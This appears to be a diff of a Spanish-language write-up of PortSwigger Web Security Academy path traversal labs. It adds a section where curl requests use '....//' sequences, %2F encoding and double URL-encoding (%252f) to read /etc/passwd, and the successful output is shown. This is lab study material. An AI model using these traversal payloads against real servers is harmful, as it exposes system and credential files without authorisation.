@@ -52,18 +52,7 @@ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-peter:x:2001:2001::/home/peter:/bin/bash
-carlos:x:2002:2002::/home/carlos:/bin/bash
-user:x:2000:2000::/home/user:/bin/bash
-dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
+....
 ```
 
 Y si vamos a la pagina del laboratio vemos que ya la tenemos resuelta :D
@@ -140,7 +129,43 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
+....
 ```
 
 ## 4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+```bash
+https://acaa1f311fcad91f8028226d004e00b0.web-security-academy.net/image?filename=38.jpg
+```
+
+Verificamos si el metodo a usar del laboratorio anterior es suficiente.
+
+```bash
+└──╼ $curl 'https://acaa1f311fcad91f8028226d004e00b0.web-security-academy.net/image?filename=....//....//....//etc/passwd'
+"No such file"
+```
+
+Como vemos no es posible, entonces intentaremos codificando el caracter **/** y que en urlenconde sería igual a **%2F**.
+
+```bash
+└──╼ $curl 'https://acaa1f311fcad91f8028226d004e00b0.web-security-academy.net/image?filename=..%2F..%2F..%2Fetc%2Fpasswd'
+"No such file"
+```
+
+Como podemos ver, tampoco funciona, así que buscaremos otras codificaciones posibles para **/**. Y por ahí nos topamos que se puede encodear con la siguiente cadena **%252f**.
+
+```bash
+└──╼ $curl 'https://acaa1f311fcad91f8028226d004e00b0.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+....
+```
+
+## 5. Lab: File path traversal, validation of start of path
 
